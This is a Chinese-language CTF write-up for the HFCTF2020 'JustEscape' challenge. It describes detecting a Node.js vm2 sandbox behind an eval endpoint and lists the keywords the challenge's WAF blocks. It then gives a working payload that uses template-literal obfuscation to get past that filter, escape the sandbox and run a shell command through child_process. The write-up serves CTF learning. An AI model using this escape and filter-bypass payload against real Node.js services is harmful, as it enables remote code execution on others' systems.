---
title: '[HFCTF2020]JustEscape'
date: 2024-06-21 20:20:26
tags: 
      - nodejs
      - 沙箱逃逸
categories: 刷题笔记
---

### [HFCTF2020]JustEscape（vm沙箱逃逸）

页面有一堆提示的东西

![image-20240621205503656](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212055791.png)

我们可以访问

/run.php

发现了一串代码

<!--more-->

```
<?php
if( array_key_exists( "code", $_GET ) && $_GET[ 'code' ] != NULL ) {
    $code = $_GET['code'];
    echo eval(code);
} else {
    highlight_file(__FILE__);
}
?>
```

考虑到提示，又由于eval()函数不仅仅是php含有的，Node.js也有这个函数。于是用`Errot().stack`测试，页面回显了一堆错误报错。

![image-20240621210247886](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212102934.png)

测试过后发现是nodejs。

根据这些报错，应该可以确认是vm沙箱逃逸，在这里面有最新的沙箱逃逸的poc。https://github.com/patriksimek/vm2/issues/225
但是直接用的话，应该会被waf拦截

![image-20240621211244892](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212112024.png)

经过探测，发现waf过滤掉了一下的关键字。

```
['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '"',''']
```

我们用javascript的模版文字绕过。

```
prototype变成`${`${`prototyp`}e`}`
```

payload.

```
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()

```

![image-20240621211407655](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212114866.png)

当然prototype还能用拼接绕过

```
prototype变成`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`
```

